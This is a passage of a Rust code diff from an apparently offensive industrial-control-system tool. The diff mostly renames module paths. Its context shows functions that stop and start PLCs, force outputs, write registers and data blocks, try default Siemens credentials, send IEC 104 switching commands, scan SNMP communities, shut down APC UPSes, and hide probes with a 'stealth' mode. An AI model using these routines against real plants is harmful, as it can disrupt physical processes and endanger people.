     let port = if port == 0 { 102 } else { port };
     let password = device_field_str(ip, "password");
     let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
@@ -3686,7 +3686,7 @@ fn modbus_map_chunks(range: ModbusMapRange) -> Vec<(u16, u16)> {
 }
 
 fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
 
     let ranges = match parse_modbus_map_input(input) {
         Ok(ranges) => ranges,
@@ -3699,7 +3699,7 @@ fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     let mode = if mode.is_empty() { "quick" } else { mode };
     out(&format!(
         "[*] Modbus map on {ip}:{} ({mode}, read-only)...",
-        crate::core::modbus::effective_port(port)
+        casket::core::modbus::effective_port(port)
     ));
     out("[*] Modbus exposes address tables, not semantic tag names; this maps readable ranges.");
     let mut points_addr = Vec::<String>::new();
@@ -3843,7 +3843,7 @@ fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn emit_modbus_interesting_limited(
-    regs: &[crate::core::modbus::ModbusRegister],
+    regs: &[casket::core::modbus::ModbusRegister],
     out: &impl Fn(&str),
     printed: &mut usize,
     header_printed: &mut bool,
@@ -4038,7 +4038,7 @@ fn slmp_map_chunks(range: SlmpMapRange) -> Vec<(u32, u16)> {
 }
 
 fn exploit_slmp_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::slmp;
+    use casket::vendors::mitsubishi::slmp;
 
     let ranges = match parse_slmp_map_input(input) {
         Ok(ranges) => ranges,
@@ -4154,7 +4154,7 @@ fn exploit_slmp_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn emit_slmp_interesting_limited(
-    vals: &[crate::vendors::mitsubishi::slmp::SlmpValue],
+    vals: &[casket::vendors::mitsubishi::slmp::SlmpValue],
     out: &impl Fn(&str),
     printed: &mut usize,
     header_printed: &mut bool,
@@ -4180,7 +4180,7 @@ fn emit_slmp_interesting_limited(
 fn collect_modbus_points(
     table: ModbusTable,
     typ: &str,
-    regs: &[crate::core::modbus::ModbusRegister],
+    regs: &[casket::core::modbus::ModbusRegister],
     addrs: &mut Vec<String>,
     types: &mut Vec<String>,
     values: &mut Vec<String>,
@@ -4197,7 +4197,7 @@ fn collect_modbus_points(
 }
 
 fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
@@ -4231,7 +4231,7 @@ fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
 }
 
 fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
@@ -4265,7 +4265,7 @@ fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
@@ -4301,7 +4301,7 @@ fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 // ─── New Phoenix exploits ────────────────────────────────────────────────────
 
 fn exploit_modbus_discrete(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
@@ -4335,7 +4335,7 @@ fn exploit_modbus_discrete(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
 }
 
 fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::control;
+    use casket::vendors::phoenix::control;
     let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
     out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
     match control::control_ilc150(ip, port, action, start_type) {
@@ -4345,7 +4345,7 @@ fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &impl F
 }
 
 fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::control;
+    use casket::vendors::phoenix::control;
     out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
     match control::control_ilc390(ip, port, input) {
         Ok(state) => out(&format!("[+] PLC state: {state}")),
@@ -4356,7 +4356,7 @@ fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &impl F
 // ─── New Mitsubishi exploits ─────────────────────────────────────────────────
 
 fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::control;
+    use casket::vendors::mitsubishi::control;
     let iface = NetworkInterface {
         name: "auto".into(),
         ip: local_ip_for(ip),
@@ -4371,7 +4371,7 @@ fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::slmp;
+    use casket::vendors::mitsubishi::slmp;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
@@ -4401,7 +4401,7 @@ fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&st
 }
 
 fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::slmp;
+    use casket::vendors::mitsubishi::slmp;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
@@ -4433,7 +4433,7 @@ fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&st
 // ─── Modbus write exploits ────────────────────────────────────────────────────
 
 fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
     let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
     let on = !state_s.trim().eq_ignore_ascii_case("off");
@@ -4448,7 +4448,7 @@ fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &impl Fn(&st
 }
 
 fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
     let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
     let value = val_s.trim().parse::<u16>().unwrap_or(0);
@@ -4460,7 +4460,7 @@ fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &impl Fn
 }
 
 fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modbus;
+    use casket::vendors::schneider::modbus;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let values: Vec<u16> = vals_s
@@ -4484,7 +4484,7 @@ fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &impl F
 // ─── Schneider FC90 exploits ──────────────────────────────────────────────────
 
 fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modicon_fc90;
+    use casket::vendors::schneider::modicon_fc90;
     out(&format!(
         "[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."
     ));
@@ -4496,7 +4496,7 @@ fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modicon_fc90;
+    use casket::vendors::schneider::modicon_fc90;
     out(&format!(
         "[*] FC90 START command to {ip} (M340/Quantum/Premium)..."
     ));
@@ -4508,7 +4508,7 @@ fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modicon_fc90;
+    use casket::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 STOP TM221 to {ip}..."));
     match modicon_fc90::stop_tm221(ip, port) {
         Ok(true) => out("[+] TM221 stopped"),
@@ -4518,7 +4518,7 @@ fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modicon_fc90;
+    use casket::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 START TM221 to {ip}..."));
     match modicon_fc90::start_tm221(ip, port) {
         Ok(true) => out("[+] TM221 started"),
@@ -4528,7 +4528,7 @@ fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::modicon_fc90::{self, ForceState};
+    use casket::vendors::schneider::modicon_fc90::{self, ForceState};
     let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
     let output_byte =
         u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
@@ -4550,7 +4550,7 @@ fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 // ─── SLMP write exploits ──────────────────────────────────────────────────────
 
 fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::slmp;
+    use casket::vendors::mitsubishi::slmp;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let values: Vec<u16> = vals_s
@@ -4572,7 +4572,7 @@ fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::slmp;
+    use casket::vendors::mitsubishi::slmp;
     let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let values: Vec<bool> = bits_s
@@ -4601,7 +4601,7 @@ fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 // ─── Siemens DB write exploit ─────────────────────────────────────────────────
 
 fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let password = device_field_str(ip, "password");
     let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
@@ -4643,8 +4643,8 @@ fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str
 
 fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::creds;
-    use crate::vendors::default_creds;
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::default_creds;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     out(&format!(
         "[*] Probing {ip}:{port} for S7Comm access protection..."
@@ -4689,7 +4689,7 @@ fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
 // ─── Beckhoff write symbol exploit ───────────────────────────────────────────
 
 fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
     let value_bytes: Vec<u8> = hex_val
@@ -4729,7 +4729,7 @@ fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn
 // ─── Omron FINS exploits ──────────────────────────────────────────────────────
 
 fn exploit_omron_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     out(&format!("[*] Getting Omron device info from {ip}..."));
     match fins::get_device_info_tcp(ip, port) {
         Ok(dev) => {
@@ -4743,7 +4743,7 @@ fn exploit_omron_info(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
@@ -4765,7 +4765,7 @@ fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
 }
 
 fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let values: Vec<u16> = vals_s
@@ -4787,7 +4787,7 @@ fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
 }
 
 fn exploit_omron_cpu_status(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     out(&format!("[*] Reading CPU status from {ip}..."));
     match fins::get_cpu_state(ip, port, 0) {
         Ok(state) => out(&format!("[+] CPU State: {state}")),
@@ -4796,7 +4796,7 @@ fn exploit_omron_cpu_status(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     out(&format!(
         "[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."
     ));
@@ -4808,7 +4808,7 @@ fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::omron::fins;
+    use casket::vendors::omron::fins;
     out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
     match fins::set_cpu_mode(ip, port, 0, false) {
         Ok(true) => out("[+] CPU stopped"),
@@ -4820,7 +4820,7 @@ fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
 // ─── IEC 60870-5-104 exploits ─────────────────────────────────────────────────
 
 fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::iec104::client;
+    use casket::vendors::iec104::client;
     out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
     match client::connect(ip, port) {
         Ok(mut sess) => {
@@ -4843,7 +4843,7 @@ fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::iec104::client;
+    use casket::vendors::iec104::client;
     let ioa = input.trim().parse::<u32>().unwrap_or(1);
     out(&format!(
         "[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."
@@ -4859,7 +4859,7 @@ fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::iec104::client;
+    use casket::vendors::iec104::client;
     let ioa = input.trim().parse::<u32>().unwrap_or(1);
     out(&format!(
         "[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."
@@ -4875,7 +4875,7 @@ fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
 }
 
 fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::iec104::client;
+    use casket::vendors::iec104::client;
     let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
     let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
     let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
@@ -6095,8 +6095,8 @@ fn handle_references(app: &mut App, code: KeyCode) {
     }
 }
 
-fn references_vendor_refs(app: &App) -> Vec<&'static scadaver::references::Reference> {
-    use scadaver::references;
+fn references_vendor_refs(app: &App) -> Vec<&'static casket::references::Reference> {
+    use casket::references;
     let Some(dev) = app.selected_device() else {
         return Vec::new();
     };
@@ -6119,7 +6119,7 @@ fn references_vendor_refs(app: &App) -> Vec<&'static scadaver::references::Refer
 }
 
 fn draw_references(frame: &mut Frame, area: Rect, app: &mut App) {
-    use scadaver::references::Reference;
+    use casket::references::Reference;
 
     let popup = centered_rect(72, 82, area);
     frame.render_widget(Clear, popup);
@@ -6598,7 +6598,7 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
         }
         KeyCode::Char('z' | 'Z') => {
             app.stealth = !app.stealth;
-            crate::core::autodetect::set_stealth(app.stealth);
+            casket::core::autodetect::set_stealth(app.stealth);
             let state = if app.stealth { "ON" } else { "OFF" };
             app.log(format!("[!] Stealth mode {state}: probes will {}",
                 if app.stealth { "shuffle order and add jitter" } else { "run at full speed" }
@@ -6933,7 +6933,7 @@ fn draw_vendor_picker(frame: &mut Frame, area: Rect, app: &App) {
 /// from `device_tag_members`, including grouped leaves for non-Rockwell vendors.
 fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, bool)> {
     use crate::db::{Database, MemberRecord};
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
 
     let Ok(db) = Database::open(&Database::default_path()) else { return Vec::new() };
     let Ok(tags) = db.load_tags(ip) else { return Vec::new() };
@@ -7975,7 +7975,7 @@ fn hex_fmt(b: &[u8]) -> String {
 // ─── SNMP exploits ────────────────────────────────────────────────────────────
 
 fn exploit_snmp_sys_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
+    use casket::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP system info from {ip}:{p}..."));
     let community_owned;
@@ -8005,7 +8005,7 @@ fn exploit_snmp_sys_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
 }
 
 fn exploit_snmp_interfaces(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
+    use casket::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP interface table from {ip}:{p}..."));
     let community_owned;
@@ -8034,7 +8034,7 @@ fn exploit_snmp_interfaces(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
 }
 
 fn exploit_snmp_topology(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
+    use casket::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP network topology from {ip}:{p}..."));
     let community_owned;
@@ -8059,7 +8059,7 @@ fn exploit_snmp_topology(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
 }
 
 fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
+    use casket::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP community scan on {ip}:{p}..."));
     let mut found = 0u32;
@@ -8077,7 +8077,7 @@ fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_snmp_cve_probe(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
+    use casket::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
     let community_owned;
@@ -8111,7 +8111,7 @@ fn exploit_snmp_cve_probe(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
 }
 
 fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::client;
+    use casket::vendors::snmp::client;
     let p = if port == 0 { client::SNMP_PORT } else { port };
     let (root, user_community) = match input.trim().rsplit_once(' ') {
         Some((oid, comm)) if !comm.trim().is_empty() => (oid.trim(), Some(comm.trim())),
@@ -8143,7 +8143,7 @@ fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
+    use casket::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     let community = if input.trim().is_empty() { "private" } else { input.trim() };
     out(&format!("[*] SNMP write test on {ip}:{p} with community='{community}'..."));
@@ -8163,7 +8163,7 @@ fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
 }
 
 fn exploit_snmp_apc_status(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
+    use casket::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] APC UPS status from {ip}:{p}..."));
     let community_owned;
@@ -8195,7 +8195,7 @@ fn exploit_snmp_apc_status(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
 }
 
 fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
+    use casket::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     let community = if input.trim().is_empty() { "private" } else { input.trim() };
     out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
@@ -8708,7 +8708,7 @@ mod tests {
         let snmp_default = app_with_device("snmp", serde_json::json!({}));
         assert_eq!(
             snmp_default.action_port("snmp", 0),
-            crate::vendors::snmp::client::SNMP_PORT,
+            casket::vendors::snmp::client::SNMP_PORT,
         );
     }
 }
